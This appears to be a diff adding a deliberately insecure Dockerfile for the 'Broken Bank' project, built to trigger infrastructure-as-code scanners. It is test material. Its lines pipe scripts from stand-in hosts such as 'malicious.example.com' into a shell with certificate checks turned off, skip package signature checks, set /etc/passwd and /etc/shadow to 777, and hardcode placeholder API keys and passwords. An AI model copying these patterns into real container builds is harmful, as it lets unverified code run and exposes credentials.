@@ -1,0 +1,183 @@
+# ==============================================================================
+# GoCortex Broken Bank - IaC Misconfigurations for Security Scanner Testing
+# ==============================================================================
+# WARNING: This Dockerfile contains intentional security misconfigurations
+# for Infrastructure-as-Code (IaC) security scanner validation and testing.
+#
+# DO NOT BUILD OR RUN THIS FILE IN ANY ENVIRONMENT
+#
+# This file exists solely to trigger IaC policy violations during CI/CD
+# security scans. It is not referenced by docker-compose and will not
+# affect normal container builds.
+#
+# Categories covered:
+# - Certificate validation bypasses (curl, wget, pip, npm, git)
+# - Environment variable security misconfigurations
+# - Package manager insecure configurations (apt, yum, rpm, apk)
+# - Privilege escalation and credential exposure
+# - Missing security hardening (HEALTHCHECK, USER, WORKDIR)
+# ==============================================================================
+
+# FAILSAFE: This RUN instruction will fail the build immediately if anyone
+# attempts to build this Dockerfile. Remove this line at your own risk.
+FROM alpine:latest AS failsafe
+RUN echo "ERROR: Dockerfile.BrokenBank is for IaC scanning only. Do not build." && exit 1
+
+# ==============================================================================
+# SECTION 1: Base Image Misconfigurations
+# ==============================================================================
+
+# Using latest tag without version pinning (unpredictable builds)
+FROM ubuntu:latest
+
+# Using deprecated MAINTAINER instruction instead of LABEL
+MAINTAINER vulnerable@example.com
+
+# No USER instruction - running as root by default
+
+# No WORKDIR instruction - operating in undefined directory
+
+# No HEALTHCHECK instruction - container health status unknown
+
+# ==============================================================================
+# SECTION 2: Certificate Validation Bypasses
+# ==============================================================================
+
+# curl with disabled certificate validation
+RUN curl -k https://example.com/package.tar.gz -o /tmp/package.tar.gz
+RUN curl --insecure https://malicious.example.com/script.sh | sh
+
+# wget with disabled certificate validation
+RUN wget --no-check-certificate https://example.com/installer.sh -O /tmp/installer.sh
+RUN wget --no-check-certificate https://untrusted.example.com/binary
+
+# pip with trusted host bypassing certificate checks
+RUN pip install --trusted-host pypi.example.com --trusted-host files.example.com package
+RUN pip install --trusted-host untrusted.internal somepackage
+
+# Python HTTPS verification disabled via environment variable
+ENV PYTHONHTTPSVERIFY=0
+ENV PYTHONHTTPSVERIFY="0"
+
+# Node.js TLS verification disabled via environment variable
+ENV NODE_TLS_REJECT_UNAUTHORIZED=0
+ENV NODE_TLS_REJECT_UNAUTHORIZED="0"
+
+# npm strict SSL disabled
+RUN npm config set strict-ssl false
+RUN npm config set strict-ssl=false
+
+# git SSL verification disabled
+RUN git config --global http.sslVerify false
+RUN git config --global http.sslVerify "false"
+
+# ==============================================================================
+# SECTION 3: Package Manager Insecure Configurations
+# ==============================================================================
+
+# APT force installation without prompts or verification
+RUN apt-get install -y --force-yes unverified-package
+RUN apt-get install --allow-unauthenticated malicious-package
+RUN apt-get -o Acquire::AllowInsecureRepositories=true update
+
+# APT without version pinning
+RUN apt-get update && apt-get install -y \
+    curl \
+    wget \
+    vim \
+    sudo \
+    netcat
+
+# YUM with disabled SSL verification
+RUN yum-config-manager --setopt=sslverify=0 --save
+RUN yum install --disableplugin=subscription-manager package
+
+# YUM with disabled GPG signature checks
+RUN yum install --nogpgcheck untrusted-package
+RUN yum-config-manager --setopt=gpgcheck=0 --save
+
+# RPM with signature check skipped
+RUN rpm -ivh --nosignature /tmp/unsigned-package.rpm
+RUN rpm --nosignature -Uvh untrusted.rpm
+
+# APK with untrusted repositories
+RUN apk add --allow-untrusted /tmp/package.apk
+RUN apk add --no-cache --allow-untrusted malicious-package
+
+# ==============================================================================
+# SECTION 4: Privilege and Credential Exposure
+# ==============================================================================
+
+# Using sudo in container (privilege escalation risk)
+RUN sudo apt-get update
+RUN sudo chmod 777 /etc/passwd
+
+# chpasswd used to set passwords (credential exposure)
+RUN echo "root:password123" | chpasswd
+RUN echo "admin:admin" | chpasswd
+
+# Hardcoded secrets in environment variables
+ENV API_KEY="sk-1234567890abcdefghijklmnop"
+ENV DATABASE_PASSWORD="SuperSecretPassword123!"
+ENV AWS_ACCESS_KEY_ID="AKIAIOSFODNN7EXAMPLE"
+ENV AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
+ENV GITHUB_TOKEN="ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
+ENV SLACK_WEBHOOK="https://hooks.slack.com/services/T00000000/B00000000/XXXXXXXXXXXXXXXXXXXXXXXX"
+ENV STRIPE_SECRET_KEY="sk_live_4eC39HqLyjWDarjtT1zdp7dc"
+ENV JWT_SECRET="my-super-secret-jwt-key-12345"
+
+# Credentials written to files
+RUN echo "admin:hunter2" > /etc/shadow.backup
+RUN echo "mysql_password=root123" > /app/config/database.ini
+
+# ==============================================================================
+# SECTION 5: File and Permission Misconfigurations
+# ==============================================================================
+
+# Using ADD instead of COPY (allows remote URLs and auto-extraction)
+ADD https://example.com/scripts/installer.sh /tmp/
+ADD archive.tar.gz /app/
+
+# Weak file permissions
+RUN chmod 777 /etc/passwd
+RUN chmod 777 /etc/shadow
+RUN chmod 666 /var/log/secure
+RUN chmod -R 777 /app
+
+# ==============================================================================
+# SECTION 6: Network Exposure
+# ==============================================================================
+
+# Exposing SSH port (remote access risk)
+EXPOSE 22
+
+# Exposing debug/development ports
+EXPOSE 5432 3306 27017 6379 11211
+
+# ==============================================================================
+# SECTION 7: Curl Pipe to Shell Anti-Pattern
+# ==============================================================================
+
+# Downloading and executing scripts in one command (supply chain risk)
+RUN curl https://example.com/install.sh | bash
+RUN wget -qO- https://example.com/setup.sh | sh
+RUN curl -sSL https://get.example.com | sudo bash
+
+# ==============================================================================
+# SECTION 8: Additional Misconfigurations
+# ==============================================================================
+
+# Multiple RUN statements (layer bloat, not security critical but poor practice)
+RUN echo "layer1"
+RUN echo "layer2"
+RUN echo "layer3"
+
+# Using shell form instead of exec form for CMD
+CMD python app.py
+
+# Running as root explicitly
+USER root
+
+# ==============================================================================
+# END OF INTENTIONAL MISCONFIGURATIONS
+# ==============================================================================
